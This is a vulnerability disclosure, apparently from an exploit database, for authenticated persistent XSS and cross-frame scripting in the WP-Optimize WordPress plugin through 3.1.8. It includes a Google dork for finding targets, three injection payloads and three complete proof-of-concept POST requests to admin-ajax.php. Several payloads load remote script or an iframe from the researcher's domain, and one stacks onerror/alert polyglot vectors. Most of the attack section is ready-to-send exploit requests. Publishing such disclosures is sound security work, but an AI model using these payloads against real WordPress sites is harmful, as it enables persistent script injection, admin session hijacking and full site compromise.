/*!
- # VULNERABILITY: WP-Optimize WordPress Plugin <= 3.1.8 - Authenticated Persistent XSS & XFS
- # GOOGLE DORK: inurl:/wp-content/plugins/wp-optimize/
- # DATE: 2021-03-23
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Team Updraft [ https://updraftplus.com ]
- # SOFTWARE VERSION: <= 3.1.8
- # SOFTWARE LINK: https://wordpress.org/plugins/wp-optimize/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS vulnerability was discovered in the WP-Optimize plugin through v3.1.8 for WordPress.

[i] Vulnerable parameter(s): $wpo_minify_options['async_js'] (wp-optimize/templates/minify/js-settings-tab.php:90), $wpo_minify_options['exclude_css'] (wp-optimize/templates/minify/css-settings-tab.php:81), wpo-logger-options[<?php echo $option_name; ?>][] (wp-optimize/templates/settings/settings-logging.php:66).



### -- [ Impact: ]

[~] Malicious JavaScript code injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] m0ze</textarea><script src=//m0ze.ru/payload/a.js></script>

[$] m0ze<script src=//m0ze.ru/payload/a.js></script><div x

[$] <iframe src=https://m0ze.ru/payload/xfsii.html></iframe>



### -- [ PoC #1 | Authenticated Persistent XSS & XFS | Minify > JavaScript > Defer JavaScript > Defer selected JavaScript files: ]

[!] POST /wp-admin/admin-ajax.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 437

action=wp_optimize_ajax&subaction=save_minify_settings&nonce=cf0f4a4412&data%5Benable_js_minification%5D=true&data%5Benable_merging_of_js%5D=true&data%5Bexclude_js%5D=&data%5Benable_defer_js%5D=individual&data%5Basync_js%5D=m0ze%3C%2Ftextarea%3E%3Cscript+src%3D%2F%2Fm0ze.ru%2Fpayload%2Fa.js%3E%3C%2Fscript%3E&data%5Bdefer_js_type%5D=defer&data%5Bdefer_jquery%5D=true&data%5Benable_js_trycatch%5D=false&data%5Binclude_ui_elements%5D=true



### -- [ PoC #2 | Authenticated Persistent XSS & XFS | Minify > CSS > Load the following CSS files asynchronously: ]

[!] POST /wp-admin/admin-ajax.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 692

action=wp_optimize_ajax&subaction=save_minify_settings&nonce=cf0f4a4412&data%5Benable_css_minification%5D=true&data%5Benable_merging_of_css%5D=true&data%5Bexclude_css%5D=13%5C%22--%3E%5C%22%3E%5C'%60+--+%60%3C!--%3Cimg+src%3D%5C%22--%3E%3Cimg+src%3Dx+onerror%3D(alert)(%60m0ze%60)%3B%3E%5C'%5C%22%3E%5C'%5C%22%3E%3C%2Ftextarea%3E%3Cnoscript%3E%3Cp+title%3D+%5C%22%3C%2Fnoscript%3E%3Cimg+src%3Dx+onerror%3Dalert(88)+m0ze%3Dm0ze+%5C%22+autofocus+onfocus%3D%3Balert(%60m0ze%60)%3B+%5C%22&data%5Basync_css%5D=m0ze%3C%2Ftextarea%3E%3Cscript+src%3D%2F%2Fm0ze.ru%2Fpayload%2Fa.js%3E%3C%2Fscript%3E&data%5Binline_css%5D=false&data%5Bremove_print_mediatypes%5D=false&data%5Binclude_ui_elements%5D=true



### -- [ PoC #3 | Authenticated Persistent XSS & XFS | Settings > Logging settings > Store the most recent log entries in the WordPress database: ]

[!] POST /wp-admin/admin-ajax.php HTTP/2
Host: example.com
Cookie: [admin cookies]
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 980

action=wp_optimize_ajax&subaction=save_settings&nonce=cf0f4a4412&data=retention-period%3D2%26schedule_type%3Dwpo_weekly%26wp-optimize-auto%255Brevisions%255D%3Dtrue%26wp-optimize-auto%255Bdrafts%255D%3Dtrue%26wp-optimize-auto%255Btrash%255D%3Dtrue%26wp-optimize-auto%255Bspams%255D%3Dtrue%26_wpnonce_db_settings%3D8f94a32d83%26_wp_http_referer%3D%252Fwp-admin%252Fadmin.php%253Fpage%253Dwpo_settings%26enable_cache_in_admin_bar%3D1%26wpo-logger-type%255B%255D%3Dupdraft_ring_logger%26wpo-logger-options%255Bring_logger_limit%255D%255B%255D%3Dm0ze%253Cscript%2520src%253D%252F%252Fm0ze.ru%252Fpayload%252Fa.js%253E%253C%252Fscript%253E%253Cdiv%2520x%26wpo-logger-options%255Bactive%255D%255B%255D%3D1%26_wpnonce%3D8f94a32d83%26_wp_http_referer%3D%252Fwp-admin%252Fadmin.php%253Fpage%253Dwpo_settings%26enable-retention%3D0%26enable-schedule%3D0%26wp-optimize-auto%5Boptimize%5D%3D0%26wp-optimize-auto%5Bunapproved%5D%3D0%26wp-optimize-auto%5Btransient%5D%3D0%26enable-admin-bar%3D0



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
